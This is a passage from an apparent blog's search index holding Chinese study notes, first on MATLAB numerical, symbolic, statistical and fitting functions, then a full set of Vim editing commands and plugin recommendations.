8, 16]</span></span><br></pre></td></tr></table></figure>
<h5 id="多项式积分">多项式积分</h5>
<p>使用<code>polyint()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">p = [<span class="number">3</span>, <span class="number">0</span>, <span class="number">-4</span>, <span class="number">10</span>, <span class="number">-25</span>];</span><br><span class="line">q = polyint(p); <span class="comment">% 得到q = [0.6, 0, -1.3333, 5, -25, 0]</span></span><br></pre></td></tr></table></figure>
<h4 id="非线性表达式数值运算">非线性表达式数值运算</h4>
<h5 id="非线性方程组求根">非线性方程组求根</h5>
<p>使用<code>fsolve()</code>函数求根</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">F = @(x) [<span class="built_in">exp</span>(-<span class="built_in">exp</span>(-(x(<span class="number">1</span>) + x(<span class="number">2</span>)))) - x(<span class="number">2</span>)*(<span class="number">1</span> + x(<span class="number">1</span>)^<span class="number">2</span>), ...</span><br><span class="line">    x(<span class="number">1</span>) * <span class="built_in">cos</span>(x(<span class="number">2</span>)) + x(<span class="number">2</span>) * <span class="built_in">sin</span>(x(<span class="number">1</span>)) - <span class="number">0.5</span>];</span><br><span class="line">x0 = [<span class="number">0</span>, <span class="number">0</span>];</span><br><span class="line">fsolve(F, x0)</span><br></pre></td></tr></table></figure>
<h5 id="差分求导数近似值">差分求导数近似值</h5>
<p>使用<code>diff()</code>函数求差分</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">h = <span class="number">0.0001</span>; <span class="comment">% 步长</span></span><br><span class="line">x = -<span class="built_in">pi</span> : h : <span class="built_in">pi</span>;</span><br><span class="line">f = <span class="built_in">sin</span>(x);</span><br><span class="line">df = diff(f) / h;</span><br><span class="line"><span class="built_in">plot</span>(x, f, x(:, <span class="number">1</span> : <span class="built_in">length</span>(df)), df); <span class="comment">% 绘制df的函数图像时，需把x向量的长度设置为与df相同</span></span><br></pre></td></tr></table></figure>
<h5 id="数值积分">数值积分</h5>
<p>使用<code>integral()</code>函数，使用<code>integral2()</code>,<code>integral3()</code>进行二重、三重积分</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">f = @(x) <span class="built_in">exp</span>(-x.^<span class="number">2</span>) .* <span class="built_in">log</span>(x).^<span class="number">2</span>;</span><br><span class="line">I = integral(f, <span class="number">0</span>, Inf); <span class="comment">% 得到I = 1.9475</span></span><br></pre></td></tr></table></figure>
<h4 id="符号运算">符号运算</h4>
<h5 id="创建符号变量">创建符号变量</h5>
<p>使用<code>sym</code>或<code>syms</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sin</span>(sym(<span class="built_in">pi</span>)) <span class="comment">% 得到0</span></span><br><span class="line"><span class="built_in">sin</span>(<span class="built_in">pi</span>)      <span class="comment">% 得到1.2246e-16</span></span><br><span class="line">phi = (<span class="number">1</span> + <span class="built_in">sqrt</span>(sym(<span class="number">5</span>))) / <span class="number">2</span> <span class="comment">% 得到5^(1/2)/2 + 1/2</span></span><br><span class="line"></span><br><span class="line">syms a, b, c; <span class="comment">% 创建符号变量a, b, c</span></span><br><span class="line">syms a [<span class="number">2</span>, <span class="number">4</span>] <span class="comment">% 创建2行4列的符号矩阵</span></span><br></pre></td></tr></table></figure>
<h5 id="化简符号表达式">化简符号表达式</h5>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">函数</th>
<th style="text-align: center;">功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>simplify()</code></td>
<td style="text-align: center;">一般的表达式化简</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>expand()</code></td>
<td style="text-align: center;">展开表达式</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>factor()</code></td>
<td style="text-align: center;">分解因式</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>horner()</code></td>
<td style="text-align: center;">将多项式化为嵌套形式</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>subs()</code></td>
<td style="text-align: center;">将表达式中的符号做代换</td>
</tr>
</tbody>
</table>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">syms x y;</span><br><span class="line">f = (x + <span class="number">1</span>) * (x^<span class="number">2</span> + <span class="number">1</span>) * (x^<span class="number">2</span> - <span class="number">3</span>*x + <span class="number">1</span>);</span><br><span class="line">expand(f) <span class="comment">% 得到x^5 - 2*x^4 - x^3 - x^2 - 2*x + 1</span></span><br><span class="line"></span><br><span class="line">f = x^<span class="number">3</span> + x^<span class="number">2</span> - <span class="number">5</span>*x + <span class="number">3</span>;</span><br><span class="line"><span class="built_in">factor</span>(f) <span class="comment">% 得到[x + 3, x - 1, x - 1]</span></span><br><span class="line"></span><br><span class="line">f = x^<span class="number">5</span> + x^<span class="number">4</span> + x^<span class="number">3</span> + x^<span class="number">2</span> + x;</span><br><span class="line">horner(f) <span class="comment">% 得到x*(x*(x*(x*(x + 1) + 1) + 1) + 1)</span></span><br><span class="line"></span><br><span class="line">f = x^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line">subs(f, <span class="number">2</span>) <span class="comment">% 得到15</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">exp</span>(-(x^<span class="number">2</span> + y^<span class="number">2</span>));</span><br><span class="line">subs(f, x, <span class="number">2</span>) <span class="comment">% 得到exp(- y^2 - 4)</span></span><br></pre></td></tr></table></figure>
<h5 id="求方程的解析解">求方程的解析解</h5>
<p>使用<code>solve()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">syms a b c x;</span><br><span class="line">eqn1 = a*x^<span class="number">2</span> + b*x + c == <span class="number">0</span>;</span><br><span class="line">X1 = solve(eqn1);</span><br><span class="line">X1(<span class="number">1</span>) <span class="comment">% 得到-(b + (b^2 - 4*a*c)^(1/2))/(2*a)</span></span><br><span class="line">X1(<span class="number">2</span>) <span class="comment">% 得到-(b - (b^2 - 4*a*c)^(1/2))/(2*a)</span></span><br><span class="line"></span><br><span class="line">syms x y;</span><br><span class="line">eqn2 = (<span class="number">6</span>*x^<span class="number">2</span> - <span class="number">6</span>*x^<span class="number">2</span>*y + x*y^<span class="number">2</span> - x*y + y^<span class="number">3</span> - y^<span class="number">2</span> == <span class="number">0</span>);</span><br><span class="line">solve(eqn2, y)	<span class="comment">% 得到 [1, 2*x, -3*x]</span></span><br><span class="line"></span><br><span class="line">syms u v;</span><br><span class="line">eqn3 = [<span class="number">2</span>*u + v == <span class="number">0</span>, u - v == <span class="number">1</span>];</span><br><span class="line">solve(eqn3,[u v]) <span class="comment">% 得到[1/3, -2/3]</span></span><br></pre></td></tr></table></figure>
<h5 id="微积分运算">微积分运算</h5>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">函数</th>
<th style="text-align: center;">功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>limit()</code></td>
<td style="text-align: center;">求极限</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>diff()</code></td>
<td style="text-align: center;">求微分</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>int()</code></td>
<td style="text-align: center;">求积分</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>symsum()</code></td>
<td style="text-align: center;">级数求和</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>taylor()</code></td>
<td style="text-align: center;">泰勒展开</td>
</tr>
</tbody>
</table>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">syms x;</span><br><span class="line">expr = <span class="number">1</span>/x;</span><br><span class="line">limit(expr, x, <span class="number">0</span>) <span class="comment">% 得到NaN</span></span><br><span class="line">limit(expr, x, <span class="number">0</span>, <span class="string">&#x27;left&#x27;</span>) <span class="comment">% 得到-Inf</span></span><br><span class="line">limit(expr, x, <span class="number">0</span>, <span class="string">&#x27;right&#x27;</span>) <span class="comment">% 得到Inf</span></span><br><span class="line"></span><br><span class="line">syms a b c x;</span><br><span class="line">expr = a*x^<span class="number">2</span> + b*x + c;</span><br><span class="line">diff(expr, x) <span class="comment">% 得到b + 2*a*x</span></span><br><span class="line">diff(expr, a) <span class="comment">% 得到x^2</span></span><br><span class="line"></span><br><span class="line">syms x;</span><br><span class="line">expr = <span class="number">1</span>/<span class="built_in">cos</span>(x);</span><br><span class="line">int(expr, x) <span class="comment">% 得到log(1/cos(x)) + log(sin(x) + 1)</span></span><br><span class="line">int(expr, x, [-<span class="built_in">pi</span>/<span class="number">4</span>, <span class="built_in">pi</span>/<span class="number">4</span>]) <span class="comment">% 得到log(2*2^(1/2) + 3)</span></span><br><span class="line"></span><br><span class="line">syms k;</span><br><span class="line">expr = <span class="number">1</span> / k^<span class="number">2</span>;</span><br><span class="line">symsum(expr, k, [<span class="number">1</span>, Inf]) <span class="comment">% 得到pi^2/6</span></span><br><span class="line"></span><br><span class="line">syms x;</span><br><span class="line">taylor(<span class="built_in">exp</span>(x), <span class="string">&#x27;order&#x27;</span>, <span class="number">10</span>) <span class="comment">% 得到x^9/362880 + x^8/40320 + x^7/5040 + x^6/720 + x^5/120 + x^4/24 + x^3/6 + x^2/2 + x + 1</span></span><br><span class="line">taylor(<span class="built_in">sin</span>(x)) <span class="comment">% 得到x^5/120 - x^3/6 + x</span></span><br></pre></td></tr></table></figure>
<h5 id="符号表达式绘制图像">符号表达式绘制图像</h5>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">函数</th>
<th style="text-align: center;">功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>fplot()</code></td>
<td style="text-align: center;">绘制二维线图</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>fplot3()</code></td>
<td style="text-align: center;">绘制三维线图</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>ezpolar()</code></td>
<td style="text-align: center;">绘制极坐标图像</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>fmesh()</code></td>
<td style="text-align: center;">绘制三维网格图</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>fsurf()</code></td>
<td style="text-align: center;">绘制三维曲面</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>fcontour()</code></td>
<td style="text-align: center;">绘制等高线图</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>fimplicit()</code></td>
<td style="text-align: center;">绘制隐函数图像</td>
</tr>
</tbody>
</table>
<h4 id="统计与拟合">统计与拟合</h4>
<h5 id="统计">统计</h5>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">函数</th>
<th style="text-align: center;">功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>mean()</code></td>
<td style="text-align: center;">计算平均值</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>median()</code></td>
<td style="text-align: center;">计算中位数</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>mode()</code></td>
<td style="text-align: center;">计算众数</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>prctile()</code></td>
<td style="text-align: center;">计算百分位数</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>max()</code></td>
<td style="text-align: center;">计算最大值</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>min()</code></td>
<td style="text-align: center;">计算最小值</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>std()</code></td>
<td style="text-align: center;">计算标准差</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>var()</code></td>
<td style="text-align: center;">计算方差</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>skewness()</code></td>
<td style="text-align: center;">计算数据的偏度</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>kurtosis()</code></td>
<td style="text-align: center;">计算数据的峰值</td>
</tr>
</tbody>
</table>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>];</span><br><span class="line"><span class="built_in">mean</span>(x) <span class="comment">% 返回6.27</span></span><br><span class="line">median(x) <span class="comment">% 返回5</span></span><br><span class="line">mode(x) <span class="comment">% 返回5</span></span><br><span class="line"><span class="built_in">max</span>(x) <span class="comment">% 返回21</span></span><br><span class="line"><span class="built_in">min</span>(x) <span class="comment">% 返回1</span></span><br><span class="line">prctile(x, <span class="number">30</span>) <span class="comment">% 计算数据的30%位数，返回2.8</span></span><br><span class="line">prctile(x, <span class="number">100</span>) <span class="comment">% 计算数据的100%位数，返回21</span></span><br><span class="line">prctile(x, <span class="number">15</span>) <span class="comment">% 计算数据的15%位数，返回1.15</span></span><br><span class="line">std(x) <span class="comment">% 计算标准差，返回5.97</span></span><br><span class="line">var(x) <span class="comment">% 计算方差，返回35.62</span></span><br></pre></td></tr></table></figure>
<h5 id="统计图表-1">统计图表</h5>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">函数</th>
<th style="text-align: center;">功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>bar()</code></td>
<td style="text-align: center;">绘制条形图</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>stem()</code></td>
<td style="text-align: center;">绘制针状图</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>area()</code></td>
<td style="text-align: center;">绘制填充图</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>boxplot()</code></td>
<td style="text-align: center;">绘制箱线图</td>
</tr>
</tbody>
</table>
<h5 id="统计推断">统计推断</h5>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">函数</th>
<th style="text-align: center;">功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>ttest()</code></td>
<td style="text-align: center;">进行T检验</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>ztest()</code></td>
<td style="text-align: center;">进行Z检验</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>ranksum()</code></td>
<td style="text-align: center;">进行秩和检验</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>signrank()</code></td>
<td style="text-align: center;">进行符号秩检验</td>
</tr>
</tbody>
</table>
<h5 id="一元多项式拟合">一元多项式拟合</h5>
<p>使用<code>polyfit()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">x = <span class="number">0</span> : <span class="number">0.5</span> : <span class="number">5</span>;</span><br><span class="line">y = <span class="number">1</span> ./ (<span class="number">1</span> + x);</span><br><span class="line"><span class="keyword">for</span> k = <span class="number">1</span> : <span class="number">6</span></span><br><span class="line">    p = polyfit(x, y, k); <span class="comment">% 生成k次拟合函数</span></span><br><span class="line">    x1 = <span class="built_in">linspace</span>(<span class="number">0</span>, <span class="number">5</span>); <span class="comment">% 重新取点画图</span></span><br><span class="line">    y1 = <span class="number">1</span> ./ (<span class="number">1</span> + x1);</span><br><span class="line">    p1 = polyval(p, x1); <span class="comment">% 计算在x1各点拟合函数p的取值</span></span><br><span class="line">    subplot(<span class="number">2</span>, <span class="number">3</span>, k);</span><br><span class="line">    <span class="built_in">plot</span>(x1, p1, x1, y1);</span><br><span class="line">    title(k);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h5 id="多元线性拟合">多元线性拟合</h5>
<p>使用<code>regress()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">load carsmall       <span class="comment">% 导入数据集</span></span><br><span class="line">x1 = Weight;        <span class="comment">% 以Weight为第一个拟合变量</span></span><br><span class="line">x2 = Horsepower;    <span class="comment">% 以Horsepower为第二个拟合变量</span></span><br><span class="line">y = MPG;            <span class="comment">% 以MPG为待拟合值</span></span><br><span class="line"></span><br><span class="line">X = [<span class="built_in">ones</span>(<span class="built_in">size</span>(x1)) x1 x2 x1.*x2];  <span class="comment">% 以x1,x2,x1*x2作为拟合方程的变量</span></span><br><span class="line">                                    <span class="comment">% 即设y = k + a*x1 + b*x2 + c*x1*x2</span></span><br><span class="line">b = regress(y, X);   <span class="comment">%解出向量b，有b(1) = k, b(2) = a, b(3) = b, b(4) = c</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">scatter3</span>(x1, x2, y, <span class="string">&#x27;filled&#x27;</span>)  <span class="comment">% 绘制散点图</span></span><br><span class="line"><span class="built_in">hold</span> on</span><br><span class="line">x1fit = <span class="built_in">min</span>(x1) : <span class="number">100</span> : <span class="built_in">max</span>(x1);</span><br><span class="line">x2fit = <span class="built_in">min</span>(x2) : <span class="number">10</span> : <span class="built_in">max</span>(x2);</span><br><span class="line">[X1FIT, X2FIT] = <span class="built_in">meshgrid</span>(x1fit, x2fit);</span><br><span class="line">YFIT = b(<span class="number">1</span>) + b(<span class="number">2</span>)*X1FIT + b(<span class="number">3</span>)*X2FIT + b(<span class="number">4</span>)*X1FIT.*X2FIT; <span class="comment">% 计算各点的拟合值</span></span><br><span class="line">mesh(X1FIT, X2FIT, YFIT)    <span class="comment">% 绘制拟合图</span></span><br><span class="line">xlabel(<span class="string">&#x27;Weight&#x27;</span>)</span><br><span class="line">ylabel(<span class="string">&#x27;Horsepower&#x27;</span>)</span><br><span class="line">zlabel(<span class="string">&#x27;MPG&#x27;</span>)</span><br><span class="line">view(<span class="number">50</span>,<span class="number">10</span>)</span><br><span class="line"><span class="built_in">hold</span> off</span><br></pre></td></tr></table></figure>
<h5 id="拟合工具箱">拟合工具箱</h5>
<p>使用<code>cftool()</code>打开曲线拟合工具箱，可进行数据导入，可选择各类拟合方式，并自动完成绘图</p>
<h5 id="一维插值">一维插值</h5>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">函数</th>
<th style="text-align: center;">功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>interp1()</code></td>
<td style="text-align: center;">线性插值</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>spline()</code></td>
<td style="text-align: center;">三次样条插值</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>pchip()</code></td>
<td style="text-align: center;">三次Hermite插值</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>mkpp()</code></td>
<td style="text-align: center;">生成分段多项式</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>ppval()</code></td>
<td style="text-align: center;">计算分段多项式</td>
</tr>
</tbody>
</table>
<h5 id="二维插值">二维插值</h5>
<p>使用<code>interp2()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">[X, Y] = <span class="built_in">meshgrid</span>(<span class="number">-3</span> : <span class="number">3</span>);	<span class="comment">% 生成7*7的网格</span></span><br><span class="line">V = peaks(X, Y);</span><br><span class="line">subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">surf(X, Y, V);	<span class="comment">% 绘制初始图</span></span><br><span class="line">set(gca, <span class="string">&#x27;PlotBoxAspectRatio&#x27;</span>, [<span class="number">2</span> <span class="number">2</span> <span class="number">3</span>]);</span><br><span class="line">title(<span class="string">&#x27;Original Sampling&#x27;</span>);</span><br><span class="line"></span><br><span class="line">[Xq, Yq] = <span class="built_in">meshgrid</span>(<span class="number">-3</span> : <span class="number">0.25</span> : <span class="number">3</span>);	<span class="comment">% 以0.25为间隔设置插值点</span></span><br><span class="line">Vq = interp2(X, Y, V, Xq, Yq);		<span class="comment">% 计算各点处插值后的值</span></span><br><span class="line">subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">surf(Xq, Yq, Vq);	<span class="comment">% 绘制插值图</span></span><br><span class="line">set(gca, <span class="string">&#x27;PlotBoxAspectRatio&#x27;</span>, [<span class="number">2</span> <span class="number">2</span> <span class="number">3</span>]);</span><br><span class="line">title(<span class="string">&#x27;Linear Interpolation Using Finer Grid&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="杂项">杂项</h4>
<p><code>help cmd</code>，查找指令<code>cmd</code>的用法</p>
<p>语句后加<code>;</code>，阻止终端输出该条结果</p>
<p>使用循环语句时应尽量预先分配内存空间</p>
<p>在脚本开头应该清空工作区缓存等</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">clear <span class="comment">% 清空工作区内存中的变量</span></span><br><span class="line">close <span class="comment">% 关闭之前程序绘制的图像</span></span><br><span class="line">clc   <span class="comment">% 清空终端</span></span><br></pre></td></tr></table></figure>
<p>使用<code>which function.m</code>可查看函数<code>function</code>文件所在的位置</p>
<p>使用<code>edit funtion.m</code>可查看和编辑函数<code>function</code>的源代码</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>建模</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim学习笔记</title>
    <url>/2022/01/17/Vim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="vim的一些学习资源">Vim的一些学习资源</h4>
<p>1.Terminal下的<code>vimtutor</code>，个人觉得刷上几遍<code>vimtutor</code>熟悉后应该就算Vim入门了</p>
<p>2.<code>pacvim n</code>，<code>n</code>代表选择的level，一个练习vim光标移动的小游戏</p>
<h4 id="为什么学vim">为什么学Vim</h4>
<p>装逼是第一生产力！（doge）一方面确实是因为觉得vim是一个跟此前接触的文本编辑器不太一样的新玩意，觉得这个挺酷的，另一方面是某个c语言上机题让我把30几条的if语句改为case，手动改的属实烦人，想起vim好像可以通过几个指令自动化完成。所以我相信学好vim大概是可以提高一些生产力的。</p>
<span id="more"></span>
<h4 id="vim光标移动">vim光标移动</h4>
<p>左<code>h</code> 下<code>j</code> 上<code>k</code> 右<code>l</code></p>
<p>向后一个词<code>w</code> 向后一个词忽略中间标点<code>W</code></p>
<p>移动至当前词的末尾<code>e</code> 忽略中间标点移动至当前词的末尾<code>E</code></p>
<p>向前一个词<code>b</code> 向前一个词忽略中间标点<code>B</code></p>
<p>移动到行首<code>0</code> 移动到行末<code>$</code></p>
<p>上一个段落<code>&#123;</code> 下一个段落<code>&#125;</code></p>
<p>移动到文件头<code>gg</code> 移动到文件尾<code>G</code></p>
<p>当一行长文字被显示为两行时，如下图所示，若要让光标从<code>t</code>移动到<code>y</code>，直接按<code>j</code>是无法实现的</p>
<p>到视角上的下一行<code>gj</code> 视角上的上一行<code>gk</code></p>
<p><img src="/Users/sheldon/Library/Application Support/typora-user-images/截屏2022-01-17 上午9.59.40.png" alt="截屏2022-01-17 上午9.59.40" style="zoom:50%;" /></p>
<h4 id="vim文本搜索与替换">vim文本搜索与替换</h4>
<p><code>:set hlsearch</code>可以设置为将搜索结果高亮显示</p>
<p>搜索文本<code>/</code> 到下一个搜索到的文本<code>n</code> 到上一个搜索到的文本<code>N</code></p>
<p>另一种方式：搜索文本<code>?</code> 到下一个<code>N</code> 到上一个<code>n</code></p>
<p>搜索当前光标所在的词<code>*</code></p>
<p>向后搜索同一行最近的"x"<code>fx</code> 向前搜索同一行最近的"x"<code>Fx</code></p>
<p>画面移动：让当前行停留在中间位置<code>zz</code> 停留在上方<code>zt</code> 停留在下方<code>zb</code></p>
<p>替换当前行第一个word1为word2：<code>:s/word1/word2/</code></p>
<p>替换当前行所有word1为word2：<code>:s/word1/word2/g</code></p>
<p>（注意当word中有<code>\</code>时要用<code>\\</code>表示）</p>
<p>替换第n行到最后一行中每一行第一个word1为word2：<code>:n,$s/word1/word2/</code></p>
<p>替换第n行到最后一行中每一行所有word1为word2：<code>:n,$s/word1/word2/g</code></p>
<p>替换全文每一行的第一个word1为word2：<code>:%s/word1/word2/</code></p>
<p>替换全文所有的word1为word2：<code>:%s/word1/word2/g</code></p>
<p>在行首插入指定字符<code>:%s/^/word/</code></p>
<p>在行尾插入指定字符<code>:%s/$/word/</code></p>
<h4 id="vim选取复制粘贴">vim选取、复制、粘贴</h4>
<p>进入Visual模式<code>v</code> 进入Visual模式并按行选取<code>V</code></p>
<p>复制<code>y</code> 复制一整行 <code>yy</code></p>
<p>在光标后粘贴<code>p</code> 在光标前粘贴<code>P</code> 复制n次<code>np</code></p>
<p>复制n行<code>nyy</code></p>
<p>复制从光标处到行尾<code>y$</code></p>
<p>复制到文本末尾<code>yG</code></p>
<p>撤销上一步<code>u</code> 重做撤销的操作<code>Ctrl+r</code></p>
<p>把内容复制到a寄存器<code>"ay</code> 把内容复制到b寄存器<code>"by</code> 以此类推</p>
<p>粘贴a寄存器的内容<code>"ap</code> 粘贴b寄存器的内容<code>"bp</code> 以此类推</p>
<p>检视目前所有寄存器的内容<code>:reg</code></p>
<p>设置寄存器与系统剪切板共通<code>:set clipboard=unnamed</code></p>
<h4 id="vim文本编辑">vim文本编辑</h4>
<p>在光标前进入插入模式<code>i</code> 跳到行首进入Insert模式<code>I</code></p>
<p>在光标后进入插入模式<code>a</code> 跳到行末进入Insert模式<code>A</code></p>
<p>在当前行下方创建新的一行并进入Insert模式<code>o</code></p>
<p>在当前行上方创建新的一行并进入Insert模式<code>O</code></p>
<p>删除光标所在文字<code>x</code>（删除操作都会把删除的文字放入寄存器中）</p>
<p>删除选择的内容<code>d</code></p>
<p>从光标删除至行末<code>D</code></p>
<p>删除光标所在行<code>dd</code></p>
<p>从光标删除至文本末尾<code>dG</code></p>
<p>从光标删除至文本头<code>dgg</code></p>
<p>删除选择的内容并进入Insert模式<code>c</code></p>
<p>从光标删除至行末并进入Insert模式<code>C</code></p>
<p>用"x"替换光标所在的字符<code>rx</code></p>
<p>向右或向左缩进<code>&gt;&gt;</code>或<code>&lt;&lt;</code></p>
<p>将n行向右或向左缩进<code>n&gt;&gt;</code>或<code>n&lt;&lt;</code></p>
<p>将选取内容自动排版<code>=</code></p>
<h4 id="vim多文档操作tab">vim多文档操作（tab）</h4>
<p>在当前窗口开启文档<code>:e FILENAME</code></p>
<p>新建窗口<code>:tabe</code></p>
<p>在新窗口开启文档<code>:tabe FILENAME</code></p>
<p>跳转至下一个窗口<code>gt</code></p>
<p>跳转至上一个窗口<code>gT</code></p>
<p>新增水平分割视窗<code>:new</code></p>
<p>新增垂直分割视窗<code>:vnew</code></p>
<p>移动游标到指定视窗<code>Ctrl+w+hjkl</code></p>
<p>循环移动视窗<code>Ctrl+ww</code></p>
<p>水平分割开启多个文档<code>vim -o FILE1 FILE2 ...</code></p>
<p>垂直分割开启多个文档<code>vim -O FILE1 FILE 2 ...</code></p>
<p>用分页多窗口开启多个文档<code>vim -p FILE1 FILE2 ...</code></p>
<h4 id="vim多文档操作buffer">vim多文档操作（buffer）</h4>
<p>打开多个文档，以不同buffer的形式<code>vim FILE1 FILE2 ...</code></p>
<p>列出所有buffer<code>:ls</code></p>
<p>切换到第k个buffer<code>:bk</code></p>
<p>直接切换buffer<code>:b FILENAME</code></p>
<p>切换到上一个buffer<code>Ctrl + ^</code></p>
<p>切换到下一个buffer<code>:bn</code></p>
<p>切换到上一个buffer<code>:bp</code></p>
<p>切换到第一个buffer<code>:bf</code></p>
<p>切换到最后一个buffer<code>:bl</code></p>
<p>关闭当前buffer<code>:bd</code></p>
<p>把当前所有buffer展开为tab<code>:tab ba</code></p>
<h4 id="vim文本选取进阶">vim文本选取进阶</h4>
<p>选取一个单词<code>viw</code>（i=inner，w=word）</p>
<p>选取引号里的内容<code>vi"</code> 选取花括号里的内容<code>vi&#123;</code> 以此类推</p>
<p>选取引号及其里面的内容<code>va"</code>（a=around）</p>
<p>选取tag里的内容<code>vit</code> 选取tag及tag里的内容<code>vat</code></p>
<p>可以把<code>v</code>换成<code>d</code>或<code>c</code>（d=delete, c=change)实现别的操作</p>
<p>进入Visual Block模式<code>Ctrl+v</code>，可以实现选取多行同时添加相同的内容</p>
<h4 id="vim语法">vim语法</h4>
<p>模式切换</p>
<p><code>i</code> <code>v</code> <code>V</code> <code>Ctrl+v</code> <code>Esc</code>或<code>Ctrl+[</code></p>
<p>名词</p>
<p><code>w</code> = word <code>s</code> = sentence <code>p</code> = paragraph <code>t</code> = tag 及各类符号</p>
<p>动词</p>
<p><code>y</code> = yank <code>p</code> = paste <code>d</code> = delete <code>c</code> = change</p>
<p>范围</p>
<p><code>i</code> = inner <code>a</code> = around</p>
<p>量词</p>
<p>即数字</p>
<p>指令的一般语法</p>
<p>模式+量词+动词+范围（也可以是数字）+名词</p>
<p>如：<code>viw</code> <code>v3w</code> <code>vaw</code> <code>vap</code> <code>vi&#123;</code> <code>3yy</code> <code>4p</code> <code>d3w</code>或<code>3dw</code> <code>cis</code> <code>vip</code></p>
<h4 id="实用技巧">实用技巧</h4>
<p>移动到行首<code>^</code>（跳过开头的缩进）</p>
<p>移动到第n行<code>nG</code>或<code>ngg</code></p>
<p>打开行号<code>:set number</code></p>
<p>往下翻一页<code>Ctrl+f</code></p>
<p>往上翻一页<code>Ctrl+b</code></p>
<p>将选中的代码行折叠<code>zf</code> 展开<code>zd</code></p>
<p>大小写互换<code>~</code></p>
<p>重做最后做的动作<code>.</code></p>
<p>将多行并为同一行<code>J</code></p>
<p>在Insert模式下删除一个词<code>Ctrl+w</code></p>
<p>删除光标前的内容<code>Ctrl+u</code>（Insert和Normal模式都可使用）</p>
<p>执行外部指令<code>:!指令</code></p>
<p>执行外部指令并贴上内容<code>:r!指令</code></p>
<p>使用帮助手册<code>:help</code></p>
<p>找到当前行的下一个字符x<code>fx</code> 到下一个目标字符上<code>;</code> 到上一个目标字符<code>,</code></p>
<h4 id="好用的插件总结">好用的插件总结</h4>
<p>首先使用<code>vim-plug</code>来安装插件</p>
<p>airline：界面美化</p>
<p>nerdtree：展示文件夹</p>
<p>ctrlp：文件搜索</p>
<p>emmet：代码补全（html、css）</p>
<p>surround：处理成对的引号括号问题</p>
<p>repeat：加强<code>.</code>的重做功能</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
